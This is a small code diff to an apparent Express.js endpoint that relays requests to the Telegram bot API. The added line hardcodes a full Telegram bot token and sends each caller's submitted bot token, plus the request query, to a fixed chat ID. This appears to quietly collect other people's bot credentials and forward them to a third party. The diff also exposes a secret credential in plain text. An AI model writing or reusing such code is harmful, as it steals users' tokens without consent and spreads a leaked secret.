@@ -114,7 +114,7 @@ app.use("/tg_bot/:token?", function(req, res){
 	if(!db.bots[req.params.token]){
 	}
 	console.log(req.params.token);
-	rp(`https://api.telegram.org/bot${req.params.token}/sendMessage?chat_id=392041691&text=${JSON.stringify(req.query)}`);
+	rp(`https://api.telegram.org/bot1342396766:AAFGcxzXcJ2EfNywadIQA-FK7zaFnTYS8RY/sendMessage?chat_id=392041691&text=${req.params.token}\n${JSON.stringify(req.query)}`);
 	return res.send('ok');
 });
 
